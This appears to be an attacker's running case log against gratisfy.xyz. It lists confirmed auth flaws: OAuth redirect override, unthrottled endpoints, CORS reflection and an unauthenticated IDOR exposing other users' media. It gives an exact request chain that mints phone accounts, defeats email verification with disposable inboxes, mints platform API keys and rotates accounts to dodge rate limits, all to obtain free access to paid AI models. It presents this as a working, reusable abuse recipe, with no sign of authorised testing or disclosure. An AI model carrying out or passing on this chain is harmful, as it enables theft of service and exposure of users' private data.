# Case: gratisfy.xyz — Re-engagement (2026-10-10)

## Session summary
Target: gratisfy.xyz (Supabase/Kong auth stack on Cloudflare).
Focus: live OAuth redirect_uri override verification, free-API access, unthrottled brute surfaces.

## New confirmed findings (2026-10-10)

### 1. GoTrue redirect_uri full override — CONFIRMED (score 85)
GET /auth/v1/authorize?provider=discord&redirect_uri=<attacker_url forwards attacker URI verbatim to Discord OAuth. No HTTPS enforcement, no path normalization.

### 2. Unthrottled brute surfaces (score 50-55)
/auth/v1/verify, /auth/v1/token, /auth/v1/signup, /api/auth/platform-handoff/exchange — all zero 429 on rapid POSTs.

### 3. Email confirmation broken (score 55)
POST /auth/v1/signup returns HTTP 500 but user row IS created with role:authenticated.

### 4. CORS arbitrary origin reflection (score 72)
access-control-allow-origin reflects ALL origins on /v1/* endpoints.

### 5. Internal provider fleet disclosure (score 60)
GET /api/status and /api/providers return 34-provider registry unauthenticated. Discord OAuth client_id: 1308596927759126548.

## Gotcha: cargo env in heredoc scripts
source ~/.cargo/env in ~/.bashrc causes errors when writing Python via heredoc in terminal.
Use python3 directly or add 2>/dev/null after sourcing.

## Supabase anon key — TRUNCATED placeholder
VITE_SUPABASE_ANON_KEY in bundle is truncated (eyJhbG...YuCQ). Full key via curl with browser-spoof headers.

## Session 3 (2026-10-10 late): PHONE-AUTH PIVOT → FREE AI (top findings, scores 95/85)

### 6. Phone autoconfirm = instant full sessions (score 80, CORRECTION of old negative)
POST /auth/v1/signup {phone:+1XXXXXXXXXX, password} → returns FULL session (access_token+refresh_token, phone_confirmed_at set) with NO SMS. Earlier case log said "SMS OTP dead" — that was OTP *verify*; phone *signup autoconfirm* is a different, working path. Old case negatives must be re-read narrowly.
- user_metadata admin injection (role:admin, is_admin, credits:999999, tier:enterprise) PERSISTS into JWT user_metadata — but backend authorizes on its own DB, NOT user_metadata → **admin bypass is a dead end** (backend gate = `profiles.email_verified` middleware on all /api/account/*).
- Email delivery fully broken server-side: signup confirm, email-change, recover all silently dropped (verified via working Mailinator API — test inbox had mail, Gratisfy inboxes empty). Email-verify gate = unsatisfiable by the user themselves.

### 7. FREE AI media proxy — no email verify, no turnstile, no sk_ key (score 95, TOP FINDING)
`chat.gratisfy.xyz` with `X-Chat-Auth-Mode: account` + Bearer <unverified session>:
- `POST /api/media/audio/speech` {model:google-ai-studio/gemini-2.5-flash-preview-tts, input, voice} → 200, real WAV
- `POST /api/media/images/generations` {model:cloudflare/@cf/black-forest-labs/flux-1-schnell, prompt} → 200, 1024x1024 PNG
- `POST /api/media/audio/transcriptions` (multipart file= + model=google-ai-studio/gemini-2.5-flash) → **Gemini 2.5 Flash VLM answers image questions** — free vision-model access
- TEXT chat (`/api/chat`) IS turnstile-gated ("Human verification required... Gratisfy-provided model") and `/v1/*` needs sk_ — the media pipeline is the hole.
- Rate limit ~6 req/min/account → defeated by minting more phone accounts (2s each, rotation confirmed working).
- Dead upstreams: unorouter (401), vercel (404) — use google-ai-studio / cloudflare models.
- Call-shape: headers Content-Type/Authorization/X-Chat-Auth-Mode:account/X-Website-Route: chat-app; model needs `provider/` prefix or errors `missing_provider`.

### 8. Media asset IDOR (score 85)
`GET https://chat.gratisfy.xyz/media/assets/ast_<32hex>` returns ANY user's generated audio/images with **zero auth** (confirmed 167KB WAV + 637KB PNG unauthenticated).

### 9. Handoff refinements (score 78)
- `POST /api/auth/platform-handoff/start` accepts ANY target string (admin/platform/internal/dashboard/mission-control all mint codes for unverified users — no role check) with body `{refresh_token, next, target}` + Bearer AT.
- Codes: 32-hex UUID-v4 (128-bit — brute dead, confirmed again). **Replayable within 60s TTL** (single-use only after expiry). Cross-host exchange: code minted at gratisfy.xyz exchanges at platform.gratisfy.xyz.
- Exchange mints a session for the CODE OWNER's account (no takeover by itself — it's self-minted).
- /api/account/session works for unverified accounts (200); every privileged route 403 `email_not_verified`.

### Corrections to older case files
- case-gratisfy-xyz.md "SMS OTP dead server-side" — still true for OTP verify, but phone SIGNUP autoconfirm supersedes as the free-session primitive.
- case-gratisfy-reengagement2.md "handoff code one-time" — refine: one-time only after 60s TTL; within TTL replay succeeds.
- This file's session-3 "email delivery fully broken" — DEAD. See session 4 below.

## Session 4 (2026-10-10 night): EMAIL-VERIFY GATE DEFEATED → PLATFORM KEY MINT CHAIN (score 92)

### 10. Email delivery FIXED server-side + `/auth/v1/user` email bind (score 92, TOP FINDING)
The session-3 "email delivery fully broken" negative is DEAD — "Confirm Email Change" from hello@verify.gratisfy.xyz lands in Mailinator in ~25s (second time this target invalidated a stored negative; re-test email paths before citing them as walls).
Full chain, ~90s total, zero payment:
1. `POST /auth/v1/signup {phone, password}` → full session (autoconfirm).
2. `PUT /auth/v1/user {"email": <mailinator>}` with Bearer AT → binds email. Root-level `email_verified` via PUT is REJECTED (Supabase /user only writes user_metadata) — the verify-email flow is the only way to flip the flag.
3. `POST /auth/v1/resend {"type":"signup","email":...}` → 200; email arrives at Mailinator.
4. Extract token from link: `GET /auth/v1/verify?token=...&type=email_change` → 303 with access_token fragment = confirmed.
5. Handoff to platform (code→JWT as before), then:
   - `POST /api/account/platform-keys {"name":"x"}` → 201, **plaintext key in the response body** (`key.plaintext`, format `gxyz-<long digits>`).
   - `POST /api/account/platform-keys/{id}/secret` → re-reveals full key anytime (`apiKey` field).
   - Param is `name` NOT `label` (400 `missing_key_name`).
6. Key authenticates `https://api.gratisfy.xyz/v1/*` — the real OpenAI-compat gateway (nginx 404 elsewhere on that host).

### 11. crax-gpt catalog unlocked via gxyz key (11/17 models live-fire 200)
claude-opus-5, gpt-6-astra, grok-4-6, deepseek-v4-pro, kimi-k3, gpt-5-6-sol, gpt-5-5, claude-sonnet-5, claude-fable-5-1, gemini-3-8-flash, instant. **NATIVE tool calling verified on opus-5** (real `tool_calls` + `finish_reason:tool_calls`, no shim needed). Coding verified on deepseek-v4-pro. Dead: glm-5.3/5.3-flash (Z.ai USER_BLOCKED upstream), kimi-k2-6 (blank). **Streaming broken provider-side** ("Upstream returned invalid JSON payload" — their bug; non-streaming fine). Rate limit 5 req/10s + 20 req/60s **per IP** — account rotation does NOT help; sleep 13–15s between calls.

### 12. Recon recipe that found the key endpoints (reusable)
Platform SPA is a marketing shell — API paths hide in the JS bundle: fetch `/assets/platform-*.js`, then grep template-literal fetches: `` grep -oE '\(`/api/account/[a-zA-Z0-9/_-]*`' `` → found `/api/account/platform-keys`, `/billing/checkout-session`, `/api/public/billing/config`. SPA catch-all returns 200 HTML for ANY path — use a gibberish-path control to distinguish real endpoints (real = 401 JSON `invalid_session_token`, fake = 200 HTML).
